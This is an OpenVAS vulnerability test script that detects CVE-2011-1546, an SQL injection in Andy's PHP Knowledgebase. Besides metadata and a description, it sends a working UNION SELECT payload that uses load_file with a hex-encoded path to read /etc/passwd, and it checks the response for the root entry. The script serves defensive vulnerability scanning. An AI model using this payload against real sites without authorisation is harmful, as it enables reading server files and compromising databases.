###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_aphpkb_47097.nasl 5497 2017-03-06 10:23:23Z teissa $
#
# Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Andy's PHP Knowledgebase is prone to an SQL-injection vulnerability
because it fails to sufficiently sanitize user-supplied data before
using it in an SQL query.

Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.

Andy's PHP Knowledgebase 0.95.2 is vulnerable; other versions may also
be affected.";

tag_solution = "Updates are available. Please contact the vendor for more information.";

if (description)
{
 script_id(103135);
 script_version("$Revision: 5497 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-06 11:23:23 +0100 (Mon, 06 Mar 2017) $");
 script_tag(name:"creation_date", value:"2011-03-31 17:03:50 +0200 (Thu, 31 Mar 2011)");
 script_bugtraq_id(47097);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2011-1546");

 script_name("Andy's PHP Knowledgebase 's' Parameter SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/47097");
 script_xref(name : "URL" , value : "http://aphpkb.sourceforge.net/");

 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/aphpkb","/kb",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir,"/a_viewusers.php?s=1+UNION+SELECT+load_file(0x2f6574632f706173737764),null,null,null,null,null,null+limit+0"); 

  if(http_vuln_check(port:port, url:url,pattern:"root:.*:0:[01]:")) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

